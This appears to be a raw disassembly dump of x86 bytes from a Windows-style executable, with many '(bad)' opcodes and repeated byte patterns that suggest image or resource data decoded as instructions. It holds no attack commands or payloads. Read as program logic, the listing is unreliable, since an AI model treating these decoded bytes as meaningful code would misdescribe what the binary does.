  40506c:	xchg   DWORD PTR [esp+ecx*2-0x3a],ecx
  405070:	int3   
  405071:	(bad)
  405075:	dec    DWORD PTR [eax+0x80]
  40507b:	mov    BYTE PTR [edi-0x3333b9b4],al
  405081:	(bad)  
  405082:	dec    DWORD PTR [eax-0x7f107771]
  405088:	add    BYTE PTR [eax],al
  40508a:	add    BYTE PTR [eax],al
  40508c:	mov    BYTE PTR [esp+ecx*8+0x4c],al
  405090:	(bad)  
  405091:	mov    BYTE PTR [eax-0x70777178],cl
  405097:	add    BYTE PTR [eax],0x0
  40509a:	add    BYTE PTR [eax],al
  40509c:	or     BYTE PTR [esp+ecx*2+0x67],al
  4050a0:	enter  0x8888,0x88
  4050a4:	(bad)  
  4050a5:	(bad)  
  4050a6:	inc    DWORD PTR [eax]
  4050a8:	add    BYTE PTR [eax],al
  4050aa:	add    BYTE PTR [eax],al
  4050ac:	or     BYTE PTR [eax-0x78],bh
  4050af:	(bad)  
  4050b0:	(bad)
	...
  4050bc:	or     al,bh
	...
  4050e6:	add    BYTE PTR [eax],al
  4050e8:	(bad)  
  4050e9:	(bad)  
  4050ea:	(bad)  
  4050eb:	(bad)  
  4050ec:	(bad)  
  4050ed:	(bad)  
  4050ee:	(bad)  
  4050ef:	(bad)  
  4050f0:	(bad)  
  4050f1:	inc    DWORD PTR [ebx+0xfeffff]
  4050f7:	(bad)  
  4050f8:	(bad)  
  4050f9:	clc    
  4050fa:	add    BYTE PTR [edi],bh
  4050fc:	push   eax
  4050fe:	add    BYTE PTR [edi],bl
  405100:	push   eax
  405102:	add    BYTE PTR [edi],bl
  405104:	push   eax
  405106:	add    BYTE PTR [edi],bl
  405108:	xbegin 0x3ec0580e
  40510e:	add    BYTE PTR [ebx],al
  405110:	or     BYTE PTR [edi],0x0
  405113:	add    eax,DWORD PTR [eax-0x7ffd0000]
  405119:	add    BYTE PTR [eax],al
  40511b:	add    eax,DWORD PTR [eax-0x7ffd0000]
  405121:	add    BYTE PTR [eax],al
  405123:	add    eax,DWORD PTR [eax-0x7ffd0000]
  405129:	add    BYTE PTR [eax],al
  40512b:	add    eax,DWORD PTR [eax-0x7ffd0000]
  405131:	add    BYTE PTR [eax],al
  405133:	add    eax,DWORD PTR [eax-0x7fff0000]
  405139:	add    BYTE PTR [eax],al
  40513b:	add    DWORD PTR [eax-0x7fff0000],eax
  405141:	add    BYTE PTR [eax],al
  405143:	add    DWORD PTR [eax-0x1fff0000],eax
  405149:	add    BYTE PTR [eax],al
  40514b:	add    esp,edi
  40514d:	add    BYTE PTR [eax],al
  40514f:	add    edi,edi
  405151:	add    BYTE PTR [eax],al
  405153:	add    edi,edi
  405155:	add    BYTE PTR [eax],0x3
  405158:	inc    DWORD PTR [eax-0x700000f9]
  40515e:	(bad)  
  40515f:	(bad)  
  405160:	(bad)  
  405161:	(bad)  
  405162:	(bad)  
  405163:	(bad)  
  405164:	(bad)  
  405165:	(bad)  
  405166:	(bad)  
  405167:	jmp    FWORD PTR [eax]
  405169:	add    BYTE PTR [eax],al
  40516b:	add    BYTE PTR [eax],dl
  40516d:	add    BYTE PTR [eax],al
  40516f:	add    BYTE PTR [eax],ah
  405171:	add    BYTE PTR [eax],al
  405173:	add    BYTE PTR [ecx],al
  405175:	add    BYTE PTR [eax+eax*1],al
  405178:	add    BYTE PTR [eax],al
  40517a:	add    BYTE PTR [eax],al
  40517c:	add    BYTE PTR [eax],0x0
	...
  405193:	add    BYTE PTR [eax],al
  405195:	add    BYTE PTR [eax+0x800000],al
  40519b:	add    BYTE PTR [eax],al
  40519d:	add    BYTE PTR [eax+0x8000],0x0
  4051a4:	add    BYTE PTR [eax],0x80
  4051a7:	add    BYTE PTR [eax-0x7fffff80],al
  4051ad:	add    BYTE PTR [eax-0x3f3f4000],0x0
  4051b4:	add    BYTE PTR [eax],al
  4051b6:	inc    DWORD PTR [eax]
  4051b8:	add    bh,bh
  4051ba:	add    BYTE PTR [eax],al
  4051bc:	add    bh,bh
  4051be:	inc    DWORD PTR [eax]
  4051c0:	inc    DWORD PTR [eax]
  4051c2:	add    BYTE PTR [eax],al
  4051c4:	inc    DWORD PTR [eax]
  4051c6:	inc    DWORD PTR [eax]
  4051c8:	(bad)  
  4051c9:	inc    DWORD PTR [eax]
  4051cb:	add    bh,bh
  4051cd:	(bad)  
  4051ce:	inc    DWORD PTR [eax]
	...
  4051d8:	ja     0x40524a
  4051da:	add    BYTE PTR [eax+0x808787],cl
  4051e0:	xchg   DWORD PTR [eax-0x78770800],eax
  4051e6:	add    BYTE PTR [eax],al
  4051e8:	mov    BYTE PTR [eax+0x70870000],al
  4051ee:	add    BYTE PTR [eax],al
  4051f0:	mov    BYTE PTR [eax-0x77777778],cl
  4051f6:	js     0x405270
  4051f8:	mov    BYTE PTR [eax-0x77777778],cl
  4051fe:	mov    BYTE PTR [eax-0x3b7b7778],cl
  405204:	inc    edi
  405205:	int3   
  405206:	(bad)  
  405207:	mov    BYTE PTR [eax-0x78837b78],cl
  40520d:	(bad)  
  40520e:	int3   
  40520f:	mov    BYTE PTR [edx-0x307988],cl
  405215:	mov    WORD PTR [esi-0x7a877e78],es
  40521b:	push   0x88c8f7c7
  405220:	mov    BYTE PTR [edi-0x70333384],cl
  405226:	into   
  405227:	mov    BYTE PTR [eax],al
  405229:	or     BYTE PTR [esi+eax*8-0x77733032],al
  405230:	add    BYTE PTR [eax],cl
  405232:	mov    esp,cs
  405234:	enter  0xe777,0x88
  405238:	add    BYTE PTR [eax],cl
  40523a:	xchg   DWORD PTR [eax-0x77777788],ecx
  405240:	add    BYTE PTR [eax],cl
  405242:	mov    BYTE PTR [eax-0x70777778],cl
	...
  405250:	(bad)  
  405251:	inc    DWORD PTR [eax]
  405253:	add    BYTE PTR [edi+eax*1],bl
  405256:	add    BYTE PTR [eax],al
  405258:	sbb    al,0xf
  40525a:	add    BYTE PTR [eax],al
  40525c:	pop    ds
  40525d:	pop    ds
	...
  40527a:	add    BYTE PTR [eax],al
  40527c:	loopne 0x40527e
  40527e:	add    BYTE PTR [eax],al
  405280:	loopne 0x405282
  405282:	add    BYTE PTR [eax],al
  405284:	loopne 0x405286
  405286:	add    BYTE PTR [eax],al
  405288:	loopne 0x40528a
  40528a:	add    BYTE PTR [eax],al
  40528c:	(bad)  
  40528d:	inc    DWORD PTR [eax]
  40528f:	add    BYTE PTR [eax],ch
  405291:	add    BYTE PTR [eax],al
  405293:	add    BYTE PTR [eax],dh
  405295:	add    BYTE PTR [eax],al
  405297:	add    BYTE PTR [eax+0x0],ah
  40529a:	add    BYTE PTR [eax],al
  40529c:	add    DWORD PTR [eax],eax
  40529e:	or     BYTE PTR [eax],al
  4052a0:	add    BYTE PTR [eax],al
  4052a2:	add    BYTE PTR [eax],al
  4052a4:	add    BYTE PTR [ecx],cl
	...
  4052ae:	add    BYTE PTR [eax],al
  4052b0:	add    BYTE PTR [ecx],al
  4052b2:	add    BYTE PTR [eax],al
  4052b4:	add    BYTE PTR [ecx],al
  4052b6:	add    BYTE PTR [eax],al
  4052b8:	add    BYTE PTR [eax],al
  4052ba:	add    BYTE PTR [eax],al
  4052bc:	daa    
  4052bd:	add    BYTE PTR [edx],al
  4052bf:	add    BYTE PTR [eax+eax*1+0x0],bh
  4052c3:	add    BYTE PTR [edx+0x18],bh
  4052c6:	or     eax,0x1a237c00
  4052cb:	add    BYTE PTR [edi+0x30],bh
  4052ce:	daa    
  4052cf:	add    BYTE PTR [esi],al
  4052d1:	push   esp
  4052d2:	sbb    eax,DWORD PTR [eax]
  4052d4:	dec    esi
  4052d5:	dec    esi
  4052d6:	dec    esi
  4052d7:	add    BYTE PTR [ebx+ecx*2+0x43],dl
  4052db:	add    BYTE PTR [ebp+0x5e],bl
  4052de:	pop    esi
  4052df:	add    BYTE PTR [ebx+0x44],ah
  4052e2:	push   ebp
  4052e3:	add    BYTE PTR [ebx+0x63],ah
  4052e6:	arpl   WORD PTR [eax],ax
  4052e8:	push   0x66006564
  4052ed:	addr16 push 0x6a6a6a00
  4052f3:	add    BYTE PTR [ebp+ebp*2+0x6c],bh
  4052f7:	add    BYTE PTR [ecx+0x71],dh
  4052fa:	jno    0x4052fc
  4052fc:	jge    0x405370
  4052fe:	je     0x405300
  405300:	js     0x40537a
  405302:	ja     0x405304
  405304:	jnp    0x405381
  405306:	jnp    0x405308
  405308:	mov    BYTE PTR [edi],al
  40530a:	add    BYTE PTR [eax],al
  40530c:	xchg   esi,eax
  40530d:	or     al,BYTE PTR [eax]
  40530f:	add    BYTE PTR [ecx-0x66fff6ed],cl
  405315:	adc    al,BYTE PTR [eax+eax*1]
  405318:	lea    ebx,[edx*1+0x111a9000]
  40531f:	add    BYTE PTR [eax+ecx*1+0xab60000],ah
  405326:	add    BYTE PTR [eax],al
  405328:	test   al,0x15
  40532a:	add    DWORD PTR [eax],eax
  40532c:	mov    eax,0xb4000018
  405331:	sbb    DWORD PTR [ebx],edx
  405333:	add    BYTE PTR [ebx-0x68ffe3dc],cl
  405339:	es sbb al,0x0
  40533c:	lods   al,BYTE PTR ds:[esi]
  40533d:	and    BYTE PTR [eax+eax*1],cl
  405340:	mov    ebp,0xaa000c22
  405345:	daa    
  405346:	pop    ss
  405347:	add    BYTE PTR [ebx-0x47ffe8d6],dh
  40534d:	xor    DWORD PTR ds:0x262b9700,ebx
  405353:	add    BYTE PTR [ebp-0x69ffd6ce],al
  405359:	xor    eax,0x3c8b002d
  40535e:	add    BYTE PTR ss:[eax-0x46ffccc7],bl
  405365:	aaa    
  405366:	add    BYTE PTR es:[esi-0x39ffcdc4],ah
  40536d:	sbb    eax,DWORD PTR [eax]
  40536f:	add    ah,dl
  405371:	sbb    eax,DWORD PTR [eax]
  405373:	add    cl,dh
  405375:	or     eax,DWORD PTR [eax]
  405377:	add    cl,ch
  405379:	sbb    al,BYTE PTR [eax]
  40537b:	add    dl,al
  40537d:	and    ecx,DWORD PTR [ecx]
  40537f:	add    bh,dl
  405381:	and    al,BYTE PTR [eax]
  405383:	add    bh,al
  405385:	cs adc al,0x0
  405388:	out    0x23,al
  40538a:	add    BYTE PTR [eax],al
  40538c:	repz and al,0x0
  40538f:	add    dh,ah
  405391:	cmp    eax,0x37f5001d
  405396:	adc    DWORD PTR [eax],eax
  405398:	les    edi,FWORD PTR ds:0x3bd1002a
  40539e:	and    al,BYTE PTR [eax]
  4053a0:	fwait
  4053a1:	inc    edx
  4053a2:	add    BYTE PTR ss:[edx+eax*2+0x43bc003a],ah
  4053aa:	xor    eax,DWORD PTR [eax]
  4053ac:	mov    DWORD PTR [edx+0x2c],0x3448c900
  4053b3:	add    dh,dl
  4053b5:	dec    esi
  4053b6:	aaa    
  4053b7:	add    dl,cl
  4053b9:	push   ecx
  4053ba:	ds add dh,dh
  4053bd:	push   esi
  4053be:	xor    al,0x0
  4053c0:	xchg   esp,eax
  4053c1:	dec    esp
  4053c2:	inc    edi
  4053c3:	add    BYTE PTR [ecx-0x59ffadaa],bl
  4053c9:	dec    edx
  4053ca:	inc    esi
  4053cb:	add    BYTE PTR [ecx-0x4bffb7b0],ch
  4053d1:	push   ecx
  4053d2:	inc    esp
  4053d3:	add    BYTE PTR [ebp-0x4dffada7],ch
  4053d9:	pop    esp
  4053da:	push   ebp
  4053db:	add    BYTE PTR [ebp-0x57ffa69f],bl
  4053e1:	pusha  
  4053e2:	pop    ebp
  4053e3:	add    BYTE PTR [esi-0x76ffa69d],dh
  4053e9:	fs popa 
  4053eb:	add    BYTE PTR [edi-0x63ff9a9a],dl
  4053f1:	jno    0x405460
  4053f3:	add    BYTE PTR [esi-0x56ff8f8b],bl
  4053f9:	push   0x61
  4053fb:	add    BYTE PTR [edi-0x57ff9592],dh
  405401:	jb     0x40546c
  405403:	add    BYTE PTR [ecx-0x58ff948c],bh
  405409:	jg     0x405485
  40540b:	add    BYTE PTR [esi-0x37ff8d86],bh
  405411:	push   ebp
  405412:	inc    esp
  405413:	add    ah,dl
  405415:	pop    ecx
  405416:	inc    ebp
  405417:	add    ah,ah
  405419:	pop    edi
  40541a:	inc    edi
  40541b:	add    dh,cl
  40541d:	pusha  
  40541e:	dec    esi
  40541f:	add    ah,dl
  405421:	pusha  
  405422:	dec    ebp
  405423:	add    cl,cl
  405425:	addr16 pop eax
  405427:	add    dl,bl
  405429:	push   0x6ce50054
  40542e:	push   esi
  40542f:	add    bl,ah
  405431:	jb     0x405490
  405433:	add    dh,dh
  405435:	jb     0x40548f
  405437:	add    al,cl
  405439:	jbe    0x4054a5
  40543b:	add    dh,bl
  40543d:	js     0x4054a6
  40543f:	add    dh,dl
  405441:	jg     0x4054b4
  405443:	add    dh,ah
  405445:	jnp    0x4054af
  405447:	add    BYTE PTR [esi],bh
  405449:	xchg   esp,eax
  40544a:	add    BYTE PTR [si],dh
  40544d:	int    0x7e
  40544f:	add    BYTE PTR [eax],al
  405451:	jmp    FWORD PTR [ebx+0x0]
  405454:	test   BYTE PTR [eax-0x7c52ff82],al
  40545a:	jl     0x40545c
  40545c:	mov    BYTE PTR [edx+edi*2+0x6c81eb00],0x0
  405464:	hlt    
  405465:	sub    DWORD PTR [edx+0x0],0x7587ea
  40546c:	cmc    
  40546d:	lea    edi,[ecx+0x0]
  405470:	clc    
  405471:	xchg   ecx,eax
  405472:	jl     0x405474
  405474:	jg     0x4054f5
  405476:	add    DWORD PTR [eax],0x807f9c
  40547c:	jg     0x4053ff
  40547e:	add    DWORD PTR [eax],0x91a37a
  405484:	je     0x40543d
  405486:	fwait
  405487:	add    BYTE PTR [ecx-0x25],ah
  40548a:	pushf  
  40548b:	add    BYTE PTR [ebx+eax*4-0x7a7aff7c],al
  405492:	mov    DWORD PTR [eax],eax
  405494:	mov    BYTE PTR [edi-0x7474ff76],al
  40549a:	mov    WORD PTR [eax],es
  40549c:	popf   
  40549d:	mov    DWORD PTR [edx-0x706e7000],ecx
  4054a3:	add    BYTE PTR [ebp+ecx*4-0x706dff6e],cl
  4054aa:	xchg   ebp,eax
  4054ab:	add    BYTE PTR [ebx-0x6cff686d],cl
  4054b1:	xchg   ebx,eax
  4054b2:	xchg   ebx,eax
  4054b3:	add    BYTE PTR [eax-0x6cff6869],bl
  4054b9:	xchg   edi,eax
  4054ba:	fwait
  4054bb:	add    BYTE PTR [eax-0x6aff646a],bl
  4054c1:	cdq    
  4054c2:	popf   
  4054c3:	add    BYTE PTR [ebx-0x56ff6466],bl
  4054c9:	mov    ecx,DWORD PTR [eax-0x7f784800]
  4054cf:	add    BYTE PTR [ebx-0x5bff746e],ah
  4054d5:	pushf  
  4054d6:	fwait
  4054d7:	add    BYTE PTR [ebp-0x6aff6b69],dh
  4054dd:	test   eax,0xa0a4009d
  4054e2:	lahf   
  4054e3:	add    BYTE PTR [eax-0x66ff625f],bh
  4054e9:	popf   
  4054ea:	mov    ds:0xa09ca900,al
  4054ef:	add    BYTE PTR [eax-0x6eff5359],bl
  4054f5:	mov    ebx,0xa3a300a7
  4054fa:	mov    ds:0xa5a5a800,eax
  4054ff:	add    BYTE PTR [ecx-0x5bff5857],ch
  405505:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405506:	stos   BYTE PTR es:[edi],al
  405507:	add    BYTE PTR [eax+ebp*4-0x5453ff54],ah
  40550e:	lods   al,BYTE PTR ds:[esi]
  40550f:	add    BYTE PTR [eax-0x46ff5c5c],dh
  405515:	mov    ds:0xa9bc00a0,al
  40551a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40551b:	add    BYTE PTR [ebx-0x4eff5759],dh
  405521:	lods   al,BYTE PTR ds:[esi]
  405522:	lods   al,BYTE PTR ds:[esi]
  405523:	add    BYTE PTR [edx-0x4dff5454],bh
  405529:	mov    al,0xae
  40552b:	add    BYTE PTR [edi+ebp*4-0x5254ff4d],ah
  405532:	mov    al,0x0
  405534:	mov    cl,0xaf
  405536:	mov    al,0x0
  405538:	mov    esp,0xa300b4ae
  40553d:	mov    al,0xb4
  40553f:	add    BYTE PTR [eax-0x56ff484e],ch
  405545:	mov    dh,0xbc
  405547:	add    BYTE PTR [esi-0x4bff4446],ch
  40554d:	mov    bl,0xb3
  40554f:	add    BYTE PTR [ebx-0x43ff4c4d],bh
  405555:	mov    eax,0xb6b000b5
  40555a:	mov    edx,0xbab9b500
  40555f:	add    BYTE PTR [ebx-0x3bff4446],bh
  405565:	nop
  405566:	mov    DWORD PTR [eax],eax
  405568:	(bad)  
  405569:	call   0x85:0x95ea0091
  405570:	neg    BYTE PTR [ecx-0x6012ff79]
  405576:	nop
  405577:	add    al,cl
  405579:	mov    ds:0xa8db009e,eax
  40557e:	fwait
  40557f:	add    al,ch
  405581:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405582:	mov    es,WORD PTR [eax]
  405584:	cmc    
  405585:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405586:	mov    es,WORD PTR [eax]
  405588:	jmp    0x98a8:0xf80094a5
  40558f:	add    bl,ch
  405591:	mov    ch,0x9e
  405593:	add    bl,bh
  405595:	mov    bl,0x95
  405597:	add    ah,al
  405599:	stos   BYTE PTR es:[edi],al
  40559a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40559b:	add    bl,bl
  40559d:	lods   al,BYTE PTR ds:[esi]
  40559e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40559f:	add    dh,al
  4055a1:	mov    dl,0xac
  4055a3:	add    dh,dl
  4055a5:	mov    dh,0xac
  4055a7:	add    ch,al
  4055a9:	test   eax,0xb0c600b6
  4055ae:	mov    al,0x0
  4055b0:	leave  
  4055b1:	mov    eax,0xbcc300b6
  4055b6:	mov    esp,0xbcbdcc00
  4055bb:	add    cl,dl
  4055bd:	mov    ebp,0xbae800ba
  4055c2:	test   eax,0xa6b7fd00
  4055c7:	add    ch,bh
  4055c9:	mov    edi,0xc1b900b3
  4055ce:	mov    esi,0xb8c1da00
  4055d3:	add    dh,bh
  4055d5:	ret    
  4055d6:	stos   DWORD PTR es:[edi],eax
  4055d7:	add    bh,ah
  4055d9:	lds    edi,FWORD PTR [eax-0x49370300]
  4055df:	add    bh,bh
  4055e1:	sar    DWORD PTR [ebp-0x3d425200],1
  4055e7:	add    BYTE PTR [edi-0x3cff3d41],dh
  4055ed:	mov    ebp,0xc2ba00c1
  4055f2:	ret    
  4055f3:	add    BYTE PTR [ebx-0x44ff373d],dh
  4055f9:	(bad)  
  4055fa:	leave  
  4055fb:	add    BYTE PTR [edi-0x44ff3438],dh
  405601:	retf   0xcd
  405604:	ret    
  405605:	ret    
  405606:	les    eax,FWORD PTR [eax]
  405608:	retf   
  405609:	(bad)  
  40560a:	lds    eax,FWORD PTR [eax]
  40560c:	iret   
  40560d:	enter  0xc7,0xc4
  405611:	(bad)  
  405612:	leave  
  405613:	add    ah,cl
  405615:	(bad)  
  405616:	enter  0xc100,0xc9
  40561a:	retf   
  40561b:	add    bl,cl
  40561d:	retf   
  40561e:	retf   
  40561f:	add    ch,dl
  405621:	retf   0xc7
  405624:	(bad)  
  405625:	ror    edi,1
  405627:	add    ch,al
  405629:	into   
  40562a:	rol    BYTE PTR [eax],cl
  40562c:	iret   
  40562d:	iret   
  40562e:	rol    BYTE PTR [eax],1
  405630:	(bad)
  405633:	add    ch,cl
  405635:	rcl    ah,cl
  405637:	add    dh,cl
  405639:	(bad)  
  40563a:	fadd   DWORD PTR [eax]
  40563c:	retf   0xdcda
  40563f:	add    dl,dl
  405641:	rcl    ebx,cl
  405643:	add    dl,bl
  405645:	aam    0xd3
  405647:	add    ah,dl
  405649:	xlat   BYTE PTR ds:[ebx]
  40564a:	fadd   DWORD PTR [eax]
  40564c:	aam    0xd9
  40564e:	fild   DWORD PTR [eax]
  405650:	fcmovnu st,st(3)
  405652:	fild   DWORD PTR [eax]
  405654:	dec    dh
  405656:	les    eax,FWORD PTR [eax]
  405658:	in     eax,dx
  405659:	xlat   BYTE PTR ds:[ebx]
  40565a:	int    0x0
  40565c:	(bad)  
  40565d:	(bad)  
  40565e:	mov    DWORD PTR [eax],0xd2dcfe
  405664:	jmp    esp
  405666:	fiadd  DWORD PTR [eax]
  405668:	into   
  405669:	fsubrp st(1),st
  40566b:	add    bl,dl
  40566d:	fsubrp st(1),st
  40566f:	add    dl,bl
  405671:	(bad)  
  405673:	add    cl,bl
  405675:	loop   0x40565a
  405677:	add    dl,ah
  405679:	jecxz  0x40565e
  40567b:	add    cl,ch
  40567d:	out    0xe6,eax
  40567f:	add    cl,ah
  405681:	out    0xea,eax
  405683:	add    bh,ah
  405685:	jmp    0xec2b5773
  40568a:	jmp    0x40568c
  40568c:	(bad)  
  40568d:	jmp    0x405674
  40568f:	add    bh,bh
  405691:	lock jmp 0xee00:0xf0eee700
  405699:	repnz cmc 
  40569b:	add    bl,dh
  40569d:	hlt    
  40569e:	hlt    
  40569f:	add    bh,bh
  4056a1:	cmc    
  4056a2:	lock add dh,dh
  4056a5:	clc    
  4056a6:	stc    
  4056a7:	add    dh,bh
  4056a9:	(bad)  
  4056aa:	inc    BYTE PTR [eax]
	...
  4056b4:	(bad)  
  4056b5:	(bad)  
  4056b6:	inc    DWORD PTR [eax]
	...
  405760:	add    ch,bl
  405762:	fstp   st(5)
  405764:	fstp   st(5)
  405766:	stos   BYTE PTR es:[edi],al
  405767:	int    0x0
	...
  40578d:	add    ch,bl
  40578f:	fstp   st(5)
  405791:	lock icebp 
  405793:	lock lock out 0xe6,al
  405797:	out    0xdd,al
  405799:	rcl    DWORD PTR [ebp+0xd3],cl
	...
  4057bb:	add    BYTE PTR [edx-0x19192223],ch
  4057c1:	out    0xe6,al
  4057c3:	in     al,0xdd
  4057c5:	fstp   st(5)
  4057c7:	lock out 0xd3,al
  4057ca:	stos   BYTE PTR es:[edi],al
  4057cb:	fst    QWORD PTR [ebp+0x95]
	...
  4057e9:	add    bl,dl
  4057eb:	fstp   st(5)
  4057ed:	fstp   st(5)
  4057ef:	fucom  st(6)
  4057f1:	out    0xe6,al
  4057f3:	out    0xdd,al
  4057f5:	fstp   st(5)
  4057f7:	lock fstp QWORD PTR [ebx+edx*8-0x7c2c552a]
	...
  405817:	add    BYTE PTR [eax],al
  405819:	fst    st(3)
  40581b:	ror    ebp,cl
  40581d:	(bad)  
  40581e:	(bad)  
  405820:	fucom  st(6)
  405822:	out    0xf0,al
  405824:	fstp   st(1)
  405826:	(bad)  
  405828:	int    0xd3
  40582a:	fldenv [ebp+0x78d39595]
	...
  405848:	add    BYTE PTR [edi-0x29325556],ah
  40584e:	(bad)  
  405850:	out    0xe6,al
  405852:	out    0xe6,al
  405854:	fstp   st(1)
  405856:	aad    0xdd
  405858:	(bad)
  40585b:	pushf  
  40585c:	xchg   edx,eax
  40585d:	adc    DWORD PTR [eax+0x8a],0x0
	...
  405878:	add    BYTE PTR [edx-0x403a5557],ch
  40587e:	int    0xd9
  405880:	(bad)  
  405882:	out    0xdd,al
  405884:	fst    st(3)
  405886:	(bad)  
  405887:	int    0xc5
  405889:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40588a:	xchg   ebp,eax
  40588b:	nop
  40588c:	jle    0x405908
  40588e:	nop
  40588f:	nop
	...
  4058a8:	add    ch,bl
  4058aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4058ab:	stos   BYTE PTR es:[edi],al
  4058ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4058ad:	(bad)
  4058b0:	(bad)  
  4058b2:	(bad)  
  4058b4:	fxch   st(5)
  4058b6:	int    0xa7
  4058b8:	pushf  
  4058b9:	nop
  4058ba:	jle    0x405936
  4058bc:	jp     0x40593d
  4058be:	lahf   
  4058bf:	jle    0x4058c1
	...
  4058c9:	add    BYTE PTR [eax],al
  4058cb:	outs   dx,DWORD PTR ds:[esi]
  4058cc:	jp     0x40593d
	...
  4058da:	xchg   ebp,eax
  4058db:	fst    st(3)
  4058dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4058de:	test   eax,0xcdc5cdc5
  4058e3:	mov    edi,0x7f909ca9
  4058e8:	jne    0x4058fa
  4058ea:	or     eax,0x95907e71
  4058ef:	nop
  4058f0:	add    BYTE PTR [eax+0xd3],dl
  4058f6:	add    BYTE PTR [eax],al
  4058f8:	add    BYTE PTR [eax],al
  4058fa:	push   cs
  4058fb:	pushf  
  4058fc:	xor    eax,0xffffffe4
  4058ff:	or     al,0xe
  405901:	pop    es
  405902:	or     al,0x90
  405904:	outs   dx,DWORD PTR ds:[esi]
  405905:	add    BYTE PTR [eax],al
  405907:	add    BYTE PTR [eax],al
  405909:	add    BYTE PTR [eax],al
  40590b:	nop
  40590c:	xchg   ebp,eax
  40590d:	(bad)  
  40590e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40590f:	pushf  
  405910:	nop
  405911:	nop
  405912:	nop
  405913:	jg     0x40598c
  405915:	adc    edx,DWORD PTR [eax]
  405917:	or     eax,0x83750d09
  40591c:	xchg   ebp,eax
  40591d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40591e:	stos   BYTE PTR es:[edi],al
  40591f:	stos   BYTE PTR es:[edi],al
  405920:	out    0xe6,al
  405922:	nop
  405923:	add    BYTE PTR [eax],al
  405925:	add    BYTE PTR [eax],al
  405927:	add    BYTE PTR [eax],al
  405929:	(bad)  
  40592a:	pushf  
  40592b:	xchg   ecx,eax
  40592c:	jle    0x4058c7
  40592e:	fst    st(3)
  405930:	jle    0x4059aa
  405932:	adc    BYTE PTR [edi-0x23],bh
  405935:	int    0x13
  405937:	add    BYTE PTR [eax],al
  405939:	add    BYTE PTR [eax],al
  40593b:	add    BYTE PTR [eax],al
  40593d:	jle    0x4059be
  40593f:	nop
  405940:	xchg   edx,eax
  405941:	nop
  405942:	adc    edx,DWORD PTR [bp+si]
  405945:	adc    esi,DWORD PTR [ecx+0x77]
  405948:	mov    dl,BYTE PTR [esp+ebx*4-0x315a5661]
  40594f:	(bad)  
  405951:	mov    edi,0x90
  405956:	add    BYTE PTR [eax],al
  405958:	add    bl,dl
  40595a:	xchg   ecx,eax
  40595b:	pushf  
  40595c:	sbb    DWORD PTR [edi-0x566a6a23],0x78
  405963:	push   cs
  405964:	jno    0x4059e5
  405966:	(bad)  [edx+0x71]
  40596c:	add    BYTE PTR [eax],al
  40596e:	add    BYTE PTR [eax],al
  405970:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405971:	jg     0x4059ea
  405973:	ja     0x4059ef
  405975:	jp     0x4059f6
  405977:	mov    dl,BYTE PTR [ebp+ebx*4-0x131e2e5c]
  40597e:	in     al,0xda
  405980:	fst    st(3)
  405982:	xchg   ebp,eax
  405983:	add    BYTE PTR [eax],al
  405985:	add    BYTE PTR [eax],al
  405987:	add    BYTE PTR [eax],al
  405989:	xlat   BYTE PTR ds:[ebx]
  40598a:	xchg   ebp,eax
  40598b:	pushf  
  40598c:	xchg   ecx,eax
  40598d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40598e:	int    0xa9
  405990:	stos   BYTE PTR es:[edi],al
  405991:	pushf  
  405992:	(bad)  
  405994:	xchg   edx,eax
  405995:	adc    ch,BYTE PTR [edi+0x7a]
  405998:	stc    
  405999:	nop
  40599a:	jne    0x40599c
  40599c:	add    BYTE PTR [eax],al
  40599e:	lahf   
  40599f:	mov    WORD PTR [esi+0x78],?
  4059a2:	js     0x405a1e
  4059a4:	jge    0x405a23
  4059a6:	mov    cs,ebx
  4059a8:	(bad)  
  4059aa:	(bad)  
  4059ab:	mov    ecx,0x1e2d3e62
  4059b0:	cwde   
  4059b1:	loope  0x405943
  4059b3:	fld    QWORD PTR [eax]
  4059b5:	add    BYTE PTR [eax],al
  4059b7:	add    BYTE PTR [eax],al
  4059b9:	shl    DWORD PTR [eax-0x55586359],cl
  4059bf:	js     0x405944
  4059c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4059c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4059c3:	int    0xf4
  4059c5:	stc    
  4059c6:	jp     0x4059d4
  4059c8:	or     eax,0x90908377
  4059cd:	mov    WORD PTR [eax-0x5e717d81],es
  4059d3:	lahf   
  4059d4:	pushf  
  4059d5:	mov    ebp,0x245b69b0
  4059da:	sbb    ebx,DWORD PTR [edx]
  4059dc:	sbb    bl,BYTE PTR [edx+ebx*1]
  4059df:	sbb    al,0x8b
  4059e1:	loope  0x405978
  4059e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4059e4:	add    BYTE PTR [eax],al
  4059e6:	add    BYTE PTR [eax],al
  4059e8:	add    dh,dl
  4059ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4059eb:	mov    edi,0x8ccdcd99
  4059f0:	jg     0x405a70
  4059f2:	jg     0x405a72
  4059f4:	jle    0x405a75
  4059f6:	jg     0x405984
  4059f8:	xchg   ebx,eax
  4059f9:	xchg   esp,eax
  4059fa:	popf   
  4059fb:	mov    ds:0x99a4cba2,al
  405a00:	cwde   
  405a01:	stos   DWORD PTR es:[edi],eax
  405a02:	push   ecx
  405a03:	inc    esi
  405a04:	and    DWORD PTR [edx],ebx
  405a06:	sbb    bl,BYTE PTR [edx]
  405a08:	sbb    ah,BYTE PTR [ecx]
  405a0a:	and    esp,DWORD PTR [ebx]
  405a0c:	and    al,0x23
  405a0e:	and    DWORD PTR [edx],esp
  405a10:	stos   DWORD PTR es:[edi],eax
  405a11:	in     al,dx
  405a12:	pushf  
  405a13:	xchg   ebp,eax
  405a14:	add    BYTE PTR [eax],al
  405a16:	add    BYTE PTR [eax],al
  405a18:	add    bl,dl
  405a1a:	int    0xcd
